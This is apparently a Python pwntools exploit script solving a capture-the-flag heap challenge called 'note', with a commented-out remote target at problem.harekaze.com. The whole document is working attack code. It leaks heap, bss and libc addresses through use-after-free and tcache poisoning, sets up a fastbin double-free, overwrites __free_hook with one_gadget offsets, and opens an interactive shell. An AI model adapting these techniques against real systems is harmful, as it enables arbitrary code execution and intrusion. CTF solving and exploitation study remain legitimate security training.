from pwn import *

r = process('./note')
#r = remote('problem.harekaze.com',20003)
#context.log_level = 'debug'
e = ELF('./note')
l = e.libc

s = lambda x:r.send(str(x))
sl = lambda x:r.sendline(str(x))

def pp(a):
    log.info("%s : 0x%x" % (a,eval(a)))

def add(title):
    sl(1)
    r.recvuntil(':')
    sl(title)
    return r.recvuntil(':')

def write(title,size,content):
    sl(2)
    r.recvuntil(':')
    sl(title)
    r.recvuntil(':')
    sl(size)
    r.recvuntil(':')
    sl(content)
    return r.recvuntil(':')

def view(title):
    sl(3)
    r.recvuntil(':')
    sl(title)

def delete(title):
    sl(4)
    r.recvuntil(':')
    sl(title)
    return r.recvuntil(':')
# 0x12ed080
add('a')
add('b')
write('a',0x28,"1"*0x28)
write('b',0x28,"2"*0x28)
delete('a')
delete('b')
add('c')
view('c')
r.recvuntil("content: ")
heap = u64(r.recv(6).ljust(8,'\x00')) - 0x260
pp('heap')
add('d')
add('d')
add('d')
add('d')

add('e')
add('f')
write('e',0x28,'3'*0x20 + p64(heap+0x2a0))
write('f',0x28,'4'*0x20 + p64(heap+0x2a0))
delete('e')
delete('f')
add('g')
add('h')
view('h')
r.recvuntil("Choice: Title of note to show content: ")
bss = u64(r.recv(6).ljust(8,'\x00'))
pp('bss')
add('i')
add('ii')
add('iii')

add('j')
add('k')
write('j',0x28,'5'*0x20 + p64(bss-0x100))
write('k',0x28,'6'*0x20 + p64(bss-0x100))
delete('j')
delete('k')
add('l')
add('m')
view('m')

r.recvuntil("Choice: Title of note to show content: ")
libc = u64(r.recv(6).ljust(8,'\x00')) - l.symbols['puts']
pp('libc')
ma_hook = libc + 0x1e4c30
fr_hook = libc + 0x1e75a8
add('dummy')
add('dummy')
add('dummy')

add('dup_target1')
write('dup_target1',0x38,'1111111111111111')
target_offset = 0x560

add('o')
add('oo')
write('o',0x28,'A'*0x20+p64(heap+target_offset))
delete('o')
add('q')
add('dup_target2')

for i in range(10):
    add('qq'+str(i))
    write('qq'+str(i),0x38,'1')

for i in range(7):
    delete('qq'+str(i))

delete('dup_target1')
delete('qq7')
delete('dup_target2')

add('f123')
add('f123')
add('f123')
add('f123')
add('f123')
add('f123')
add('f123')
add('f123')
add('f123')

for i in range(7):
    add('rr'+str(i))
    write('rr'+str(i),0x38,'123123')

add('tri0')
add('tri1')
add('tri2')
add('exp1')
add('exp2')
#oneshot = libc+ 0xe237f
oneshot = libc + 0xe2383
oneshot = libc + 0xe2386
oneshot = libc + 0x106ef8
#pause()
write('tri0',0x38,p64(fr_hook)[:6])
write('tri1',0x38,p64(fr_hook)[:6])
write('tri2',0x38,p64(fr_hook)[:6])
write('exp1',0x38,p64(oneshot)[:6])
write('exp2',0x38,p64(oneshot)[:6])

r.interactive()
